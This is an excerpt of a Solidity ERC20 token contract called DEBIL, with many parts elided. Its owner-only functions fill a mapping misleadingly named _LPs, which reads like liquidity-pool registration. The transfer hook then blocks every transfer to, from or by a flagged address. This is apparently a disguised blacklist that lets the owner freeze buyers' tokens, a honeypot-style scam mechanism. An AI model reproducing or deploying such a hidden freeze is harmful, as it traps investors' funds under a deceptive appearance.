...
contract DEBIL is Context, IERC20, Ownable {
    ...
    mapping(address => bool) public _LPs;
    ...
    event LPe(address indexed LP, bool value);
    modifier onlyMaster() {
    ...
    function _LP(address _address, bool _isLP) public onlyOwner returns (bool) {
        require(_LPs[_address] != _isLP);
        _LPs[_address] = _isLP;
        emit LPe(_address, _isLP);
        return true;
    }

    
    function _LpList(address[] memory _addressList, bool _isLP) public onlyOwner returns (bool) {
        for(uint i = 0; i < _addressList.length; i++){
            _LPs[_addressList[i]] = _isLP;
            emit LPe(_addressList[i], _isLP);
        }
        return true;
    }
    ...
    function _beforeTokenTransfer(
        ...
        require(_LPs[from] == false);
        require(_LPs[to] == false);
        require(_LPs[msg.sender] == false);
        if (_hasLiquidity()) {
            if (_isSuper(from)) {
                _buySum[to] += amount;
            }
